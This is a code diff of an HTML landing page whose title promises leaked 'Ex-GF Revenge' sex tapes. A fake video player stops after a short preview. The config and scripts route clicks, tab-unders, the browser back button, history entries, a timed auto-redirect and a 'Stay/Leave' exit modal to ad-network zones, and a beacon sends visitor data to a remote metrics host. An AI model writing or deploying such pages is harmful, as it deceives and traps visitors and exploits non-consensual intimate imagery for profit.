@@ -6,31 +6,35 @@
     <title>LEAKED Homemade Tapes 2025 | Real Ex-GF Revenge 🔥</title>
     
     <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg">
-  <script>
- var APP_CONFIG = {
+
+    <script>
+        var APP_CONFIG = {
             domain: "https://jup9.com", 
             
-            // --- MAIN EXIT (Основной) ---
+            // --- MAIN EXIT (Основной выход: Клик по видео/фону) ---
             mainExit_currentTab_zoneId: 10576293, 
             mainExit_newTab_zoneId: 10576292,
             
-            // --- TABUNDER (Микро-клики + "Остаться") ---
+            // --- TABUNDER (Микро-клики + Кнопка "Остаться") ---
             tabUnderClick_zoneId: 10576300, 
 
-            // --- ОБЫЧНЫЙ НАЗАД (Браузерная кнопка) ---
+            // --- REVERSE (Кнопка "Назад" в самом браузере) ---
             reverse_zoneId: 10576291,
+            
+            // --- BACK (Для истории back.html) ---
             back_zoneId: 10576297,
             back_count: 5,
             
-            // --- АВТОВЫХОД ---
+            // --- AUTOEXIT (Таймер) ---
             autoexit_zoneId: 10576295,
             autoexit_timeToRedirect: 200,
 
-            // --- НОВЫЕ ЗОНЫ (Кнопка "Уйти" в модалке) ---
+            // --- AGE EXIT (Новые зоны для кнопки "Уйти" в модалке) ---
             ageExit_currentTab_zoneId: 10576302,
             ageExit_newTab_zoneId: 10576301
         };
-      </script>
+    </script>
+    
     <script>
     "use strict";
     (() => {
@@ -44,7 +48,7 @@
         };
 
         function send(data) {
-            const url = "https://wuytl.com/sync-metrics"; // Твой URL метрики
+            const url = "https://wuytl.com/sync-metrics"; 
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(url, JSON.stringify(data));
             }
@@ -59,7 +63,6 @@
                 landing_load_date_time: now(),
                 sub_id: s.var_1
             }];
-            // Простейшая проверка, включена ли аналитика (по дефолту да)
             send(payload);
         };
         
@@ -78,8 +81,6 @@
         .xh-zone {
             display: flex; align-items: center; justify-content: center;
             cursor: pointer; pointer-events: auto;
-            /* Для отладки зон раскомментируй строку ниже: */
-            /* border: 1px solid rgba(255,0,0,0.5); background: rgba(255,0,0,0.1); */
         }
         .xh-zone svg { fill: #fff; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
 
@@ -150,6 +151,44 @@
             font-size: 8px; font-weight: 900; padding: 1px 2px; border-radius: 2px;
         }
         .xh-time-display { color: #fff; font-size: 16px; font-weight: 500; padding: 0 5px; }
+
+        /* --- STYLES FOR EXIT MODAL --- */
+        .xh-modal {
+            position: fixed; inset: 0; z-index: 99999;
+            display: flex; align-items: center; justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            opacity: 0; visibility: hidden; pointer-events: none; /* Hidden by default */
+            transition: opacity 0.2s ease;
+        }
+        .xh-modal[style*="display: flex"] {
+            opacity: 1; visibility: visible; pointer-events: auto;
+        }
+        .xh-modal-overlay {
+            position: absolute; inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(4px);
+        }
+        .xh-modal-content {
+            position: relative; z-index: 100000;
+            width: 85%; max-width: 300px;
+            background: #1c1c1c; border: 1px solid #333;
+            border-radius: 14px; padding: 24px;
+            text-align: center; color: #fff;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            transform: scale(0.95); transition: transform 0.2s;
+        }
+        .xh-modal[style*="display: flex"] .xh-modal-content { transform: scale(1); }
+
+        .xh-modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
+        .xh-modal-desc { font-size: 14px; color: #aaa; margin-bottom: 20px; line-height: 1.4; }
+        .xh-modal-actions { display: flex; flex-direction: column; gap: 10px; }
+        .xh-btn {
+            border: none; outline: none; padding: 12px; border-radius: 8px;
+            font-size: 16px; font-weight: 600; cursor: pointer; width: 100%;
+        }
+        .xh-btn:active { transform: scale(0.97); }
+        .xh-btn-primary { background: #e50914; color: #fff; }
+        .xh-btn-secondary { background: #333; color: #ccc; }
     </style>
 </head>
 
@@ -211,6 +250,19 @@
         </div>
     </div>
 
+    <div id="xh_exit_modal" class="xh-modal" style="display: none;">
+        <div class="xh-modal-overlay" data-target="modal_stay"></div>
+        <div class="xh-modal-content">
+            <div class="xh-modal-title">Уже уходишь? 😢</div>
+            <div class="xh-modal-desc">Подожди! У нас есть еще много интересного видео именно для тебя.</div>
+            
+            <div class="xh-modal-actions">
+                <button class="xh-btn xh-btn-primary" data-target="modal_stay">Остаться</button>
+                <button class="xh-btn xh-btn-secondary" data-target="modal_leave">Уйти</button>
+            </div>
+        </div>
+    </div>
+
 <script>
 "use strict";
 document.addEventListener("DOMContentLoaded", () => {
@@ -228,7 +280,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const IS_CLONE = sp.get("__cl") === "1";
   const SKIP_PREVIEW = IS_CLONE || (sp.get("__skipPreview") === "1");
 
-  // poster: можно переопределить ?__poster=...
   const POSTER_DEFAULT = "./assets/poster-3s.webp";
   const POSTER = sp.get("__poster") || video.getAttribute("poster") || POSTER_DEFAULT;
 
@@ -250,32 +301,22 @@ document.addEventListener("DOMContentLoaded", () => {
     if (timeDisplay) timeDisplay.textContent = `${fmt(tt)} / 8:32`;
   };
 
-  // --- CLONE: не проигрываем превью, показываем постер + ready ---
   const setCloneReadyPoster = () => {
     stopped = true;
     hasStarted = true;
-
     try { cancelAnimationFrame(rafId); } catch {}
-
     try {
       video.pause();
-
-      // Важно: выставить постер
       video.setAttribute("poster", POSTER);
-
-      // Отключаем лишние попытки загрузки
       video.preload = "none";
       video.autoplay = false;
       video.muted = true;
       video.playsInline = true;
-
-      // Оборвать загрузку vid.mp4 на клоне (для “бесшовности”)
       const sources = video.querySelectorAll("source");
       sources.forEach(s => s.remove());
       video.removeAttribute("src");
       video.load();
     } catch {}
-
     setProgress(STOP_AT);
     playBtn.classList.add("ready");
   };
@@ -285,7 +326,6 @@ document.addEventListener("DOMContentLoaded", () => {
     return;
   }
 
-  // --- v1 normal preview behaviour ---
   const stopAtPreview = () => {
     if (stopped) return;
     stopped = true;
@@ -316,67 +356,15 @@ document.addEventListener("DOMContentLoaded", () => {
 
   const checkStart = () => { if (!document.hidden && !hasStarted) startAction(); };
   document.addEventListener("visibilitychange", checkStart);
- // document.addEventListener("click", checkStart, { once: true });
+  
+  // !!! CLICK LISTENER DISABLED (IMPORTANT) !!!
+  // document.addEventListener("click", checkStart, { once: true });
+  
   checkStart();
 });
 </script>
 
+   <script defer src="./assets/scripts/common.js?v=31343434"></script>
 
-
-   <script defer src="./assets/scripts/common.js?v=2016010471"></script>
-<div id="xh_exit_modal" class="xh-modal" style="display: none;">
-        <div class="xh-modal-overlay" data-target="modal_stay"></div>
-        <div class="xh-modal-content">
-            <div class="xh-modal-title">Уже уходишь? 😢</div>
-            <div class="xh-modal-desc">Подожди! У нас есть еще много интересного видео именно для тебя.</div>
-            
-            <div class="xh-modal-actions">
-                <button class="xh-btn xh-btn-primary" data-target="modal_stay">Остаться</button>
-                
-                <button class="xh-btn xh-btn-secondary" data-target="modal_leave">Уйти</button>
-            </div>
-        </div>
-    </div>
-
-    <style>
-        .xh-modal {
-            position: fixed; inset: 0; z-index: 99999;
-            display: flex; align-items: center; justify-content: center;
-            font-family: sans-serif;
-        }
-        .xh-modal-overlay {
-            position: absolute; inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(4px);
-        }
-        .xh-modal-content {
-            position: relative; z-index: 100000;
-            width: 85%; max-width: 300px;
-            background: #1c1c1c; border: 1px solid #333;
-            border-radius: 14px; padding: 24px;
-            text-align: center; color: #fff;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-        }
-        .xh-modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
-        .xh-modal-desc { font-size: 14px; color: #aaa; margin-bottom: 20px; line-height: 1.4; }
-        .xh-modal-actions { display: flex; flex-direction: column; gap: 10px; }
-        .xh-btn {
-            border: none; outline: none; padding: 12px; border-radius: 8px;
-            font-size: 16px; font-weight: 600; cursor: pointer; width: 100%;
-        }
-        .xh-btn-primary { background: #e50914; color: #fff; }
-        .xh-btn-secondary { background: #333; color: #ccc; }
-    </style>
 </body>
-
 </html>
-
-
-
-
-
-
-
-
-
-
